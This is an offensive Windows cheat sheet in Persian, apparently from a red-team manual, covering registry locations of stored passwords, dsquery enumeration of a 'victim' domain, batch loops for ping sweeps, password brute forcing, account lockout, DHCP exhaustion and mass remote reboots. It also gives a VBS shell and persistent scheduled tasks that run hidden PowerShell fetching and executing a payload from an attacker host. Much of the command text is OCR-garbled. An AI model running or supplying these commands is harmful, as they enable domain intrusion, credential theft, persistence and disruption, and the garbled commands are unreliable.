### کلید های کلمه عبور: LSA secret cat certain vpn, autologon, other passwords

```text
HKEY LOCAL MACHINE\Security\Policy\Secrets
HKCU\Software \Microsoft \Windows NT\CurrentVersion \Winlogon \autoadminlogon
```

### اطلاعات Audit policy

```text
HKLM\Security\Policy\PolAdTev
```

### سرویس های کرنل و کاربر 

```text
HKLM\Software\Microsoft\Windows NT\CurrentControlSet\Services
```

### نرم افزار های نصب شده در سیستم 

```text
HKLM\Software
```

### نرم افزار های نصب شده برای کاربر

```text
HKCU\Software
```

### آخرین مستندات

```text
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs
```

### آخرین موقعیت های کاربر

```text
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisite
dtmu & \Opensavetmu
```

### URL ها تایپ شده

```text
HKCU\Software\Microsoft\Internet Explorer\TypedURLs
```

### لیست های MRU 

```text
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### آخرین کلید رجیستری استفاده شده

```text
HKCU\Software\Microsoft\Windows\CurrentVersion\Applets\RegEdit /v LastKeY
```

### مسیر های راه اندازی

```text
HKLM\Software\Microsoft\Windows\CurrentVersion\Run & \Runonce
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\Run & \Runonce
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load & \Run
```

## دریافت اطلاعات ویندوز با dsquery

### لیست کاربران دامین

```text
dsquery user -limit 0
```

### لیست گروه های دامین domain=victim.com

```text
dsquery group "cn=users, dc=victim, dc=com"
```

### لیست مدیران دامین

```text
dsquery group -name "domain admins" | dsget group -members -expand
```

### لیست گروه های کاربر

```text
dsquery user -name bob | dsget user -memberof -expand
```

### دریافت id کاربر وارد شده

```text
dsquery user -name bob | dsget user -samid
```

### لیست کاربرانی که در دو هفته اخیر فعال نبوده اند

```text
dsquery user -inactive 2
```

### اضافه نمودن کاربر

```text
dsadd user "CN=Bob,CN=Users,DC=victim,DC=com" -samid bob -pwd bobpassdisplaj
"Bob" -pwdneverexpires yes -memberof "CN=Domain
Admins,CN=Users,DC=victim,DC=com
```

### حذف کاربر

```text
dsrm -subtree -noprornpt "CN=Bob,CN=Users,DC=victim,DC=com"
```

### لیست سیستم عامل های دامین

```text
dsquery A "DC=victim,DC=com" -scope subtree -attr "en" "operatingSystem"
"operatingSjstemServicePack" -filter
" (& (objectclass=computer) (objectcategory=computer) (operatingSystem=Windows}
))"
```

### لیست نام سایت ها

```text
dsquery site -o rdn -limit 0
```

### لیست کلیه subnet های درون سایت

```text
dsquery subnet -site sitename -o rdn
```

### لیست سرویس های درون سایت

```text
dsquery server -site sitename -o rdn
```

### دریافت سرور های دامین

```text
dsquery ' domainroot -filter
" (& (objectCategory=Computer) (objectClass=Computer) (operatingSystem='Server'
) ) " -limit 0
```

### لیست dc های سایت

```text
dsquery "CN=Sites,CN=Configuration,DC=forestRootDomain" -filter
(objectCategory=Server)
```

## اسکریپت نویسی

متغیر های اسکریپت های bash باید به شکل روبرو جایگزاری شوند  %%
برای مثال %%i

### ایجاد ping sweep

```text
for /L %i in (10,1,254) do@ (for /L %x in (10,1,254) do@ ping -n 1 -w 100
10.10.%i.%x 2 nul 1 find "Reply" && echo 10.10.%i.%x live.txt)
```

### ایجاد loop درون file

```text
for /F %i in ( file ) do command
```

### عملیات brute forcer دامین

```text
for /F %n in (names.txt) do for /F %pin (pawds.txt) do net use \\DC01\IPC$
/user: domain \%n %p 1 NUL 2 &1 && echo %n:%p && net use /delete
\\DCOl\IPC$ NUL
```

### بسته شدن حساب\(lockout.bat\)

```text
@echo Test run:
for /f %%U in (list.txt) do @for /1 %%C in (1,1,5) do @echo net use \\WIN-
1234\c$ /USER:%%U wrongpass
```

### عملیت DHCP exhaustion

```text
for /L %i
1.1.1.%i
in (2,1,254) do (netsh interface ip set address local static
netrnask gw ID %1 ping 127.0.0.1 -n l -w 10000 nul %1)
```

### فرآیند DNS reverse lookup

```text
for /L %i in (100, 1, 105)
dns.txt && echo Server:
do @ nslookup 1.1.1.%i I findstr /i /c:''Name''
1.1.1.%i dns.txt
```

### جست و جو کلیه مسیر های برای یافتن فایلی هایی که در آن ها PASS است و نمایش جزییات آن فایل

```text
forfi1es /P c:\temp /s /m pass -c "cmd /c echo @isdir @fdate @ftime
@relpath @path @fsize"
```

### شبیه سازی دامین مخرب \(کاربردی برای تست IDS\)

```text
# Run packet capture on attack domain to receive callout
# domains.txt should contain known malicious domains
for /L %i in (0,1,100) do (for /F %n in (domains.txt) do nslookup %n
attack domain NUL 2 &1 & ping -n 5 127.0.0.1 NUL 2 &1
```

### عملیات IE web looper \(ایجاد کننده ترافیک\)

```text
for /L %C in (1,1,5000) do @for %U in (www.yahoo.com www.pastebin.com
www.paypal.com www.craigslist.org www.google.com) do start /b iexplore %U &
ping -n 6 localhost & taskkill /F /IM iexplore.exe
```

### دریافت دسترسی سرویس های اجرایی

```text
for /f "tokens=2 delims='='" %a in ('wmic service list full | find /i
"pathname" I find /i /v "system32"') do @echo %a
c:\windows\temp\3afd4ga.tmp
for /f eol = " delims = " %a in (c:\windows\temp\3afd4ga.tmp) do cmd.exe
/c icacls ''%a''
```

### راه اندازی مجدد در حال چرخش \(جایگذاری /R با /S برای خاموش نمودن\):

```text
for /L %i in (2,1,254) do shutdown /r /m \\1.1.1.%i /f /t 0 /c "Reboot
message"
```

### ایجاد shell با استفاده از vbs \(نیاز به اطلاعات هویتی\)

```text
# Create .vbs script with the following
Set shell wscript.createobject("wscript.shell")
Shell.run "runas /user: user " & """" &
C:\Windows\System32\WindowsPowershell\vl.O\powershell.exe -WindowStyle
hidden -NoLogo -Nonlnteractive -ep bjpass -nop -c \" & """" & "IEX ((New-
Object Net.WEbClieil':).downloadstring(' url '))\" & """" & """"
wscript.sleep (100)
shell.Sendkeys " password " & "{ENTER}"
```

## زمان بندی نمودن task

```text
Scheduled tasks binary paths CANNOT contain spaces because everything
after the first space in the path is considered to be a command-line
argument. Enclose the /TR path parameter between backslash (\) AND
quotation marks ("):
... /TR "\"C:\Program Files\file.exe\" -x arg1"
```

### زمان بندی نمودن task \(ST=زمان شروع, SD=تاریخ شروع, ED=تاریخ پایان\) \*نیاز به دسترسی admin

```text
SCHTASKS /CREATE /TN Task Name /SC HOURLY /ST HH:MM /F /RL HIGHEST /SD
MM/DD/YYYY /ED MM/DD/YYYY /tr "C:\my.exe" /RU DOMAIN/user /RP
password
```

### زمان بندی نمودن همیشگی task \[10\]

```text
For 64 bit use:
"C:\Windows\syswow64\WindowsPowerShell\vl.O\powershell.exe"
# (x86) on User Login
SCHTASKS /CREATE /TN Task Name /TR
"C:\Windows\System32\WindowsPowerShell\vl.O\powershell.exe -WindowStyle
hidden -NoLogo -Noninteractive -ep bypass -nap -c 'IEX ((new-object
net.webclient) .downloadstring( ''http:// ip : port I payload'''))'" /SC
onlogon /RU System
# (x86) on System Start
SCHTASKS /CREATE /TN Task Name /TR
"C:\Windows\System32\WindowsPowerShell\vl.O\powershell.exe -WindowStyle
hidden -NoLogo -Noninteractive -ep bypass -nap -c 'IEX ((new-object
net.webclient) .downloadstring("http:// ip : port I payload"))'" /SC
onstart /RU System
# (x86) on User Idle (30 Minutes)
SCHTASKS /CREATE /TN Task Name /TR
"C:\Windows\System32\WindowsPowerShell\vl.O\powershell.exe -WindowStyle
hidden -NoLogo -Noninteractive -ep bjpass -nop -c 'IEX ((new-object
net.webclient) .downloadstring("http:// ip : port I payload"))'" /SC
onidle /i 30
```


## استفاده از فایل های .DS_Store

```text
1-find structure
python2.7 ds_store_exp.py http://poo.htb/.DS_Store
2-enum in finded path 
java -jar iis_shortname_scanner.jar 2 20 http://poo.htb/dev/dca66d38fd916317687e1390a420c3fc/db/
```
